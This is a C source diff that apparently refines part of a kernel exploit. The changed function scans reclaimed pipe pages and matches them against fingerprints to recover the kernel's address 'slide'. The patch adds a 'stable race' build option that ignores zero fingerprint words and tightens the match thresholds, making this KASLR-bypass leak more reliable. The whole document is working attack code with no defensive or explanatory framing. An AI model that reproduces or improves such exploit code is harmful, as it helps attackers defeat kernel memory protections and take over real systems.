@@ -1208,12 +1208,30 @@ static int p0_fingerprint_score(
   for (size_t index = 0; index < P0_FINGERPRINT_WORDS; index++) {
     uint64_t value = 0;
     memcpy(&value, page + p0_fingerprint_offsets[index], sizeof(value));
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+    if (fingerprint->words[index] != 0 &&
+        value == fingerprint->words[index]) {
+#else
     if (value == fingerprint->words[index]) {
+#endif
       score++;
     }
   }
   return score;
 }
+
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+static int p0_fingerprint_significant_words(
+    const struct p0_fingerprint *fingerprint) {
+  int significant = 0;
+  for (size_t index = 0; index < P0_FINGERPRINT_WORDS; index++) {
+    if (fingerprint->words[index] != 0) {
+      significant++;
+    }
+  }
+  return significant;
+}
+#endif
 
 uintptr_t scan_p0_pipe_oracle(void) {
   unsigned char page[PAGE_SIZE];
@@ -1223,6 +1241,9 @@ uintptr_t scan_p0_pipe_oracle(void) {
   int best_score = -1;
   int second_score = -1;
   int changed_pages = 0;
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+  int best_significant = 0;
+#endif
 
   for (size_t pipe_index = 0; pipe_index < PIPE_RECLAIM; pipe_index++) {
     memset(page, 0, sizeof(page));
@@ -1261,6 +1282,10 @@ uintptr_t scan_p0_pipe_oracle(void) {
         second_score = best_score;
         best_score = score;
         best_slide = p0_fingerprints[index].slide;
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+        best_significant =
+            p0_fingerprint_significant_words(&p0_fingerprints[index]);
+#endif
       } else if (score > second_score) {
         second_score = score;
       }
@@ -1283,7 +1308,12 @@ uintptr_t scan_p0_pipe_oracle(void) {
   pr_info("p0 fingerprint changed=%d best=%d second=%d slide=%08zx\n",
           changed_pages, best_score, second_score, best_slide);
 #endif
+#if defined(APP_S928_STABLE_RACE) && APP_S928_STABLE_RACE
+  if (changed_pages != 1 || best_score < 4 ||
+      best_score <= second_score || best_score * 2 < best_significant) {
+#else
   if (changed_pages != 1 || best_score < 2 || best_score <= second_score) {
+#endif
     return (uintptr_t)-1;
   }
   return best_slide;
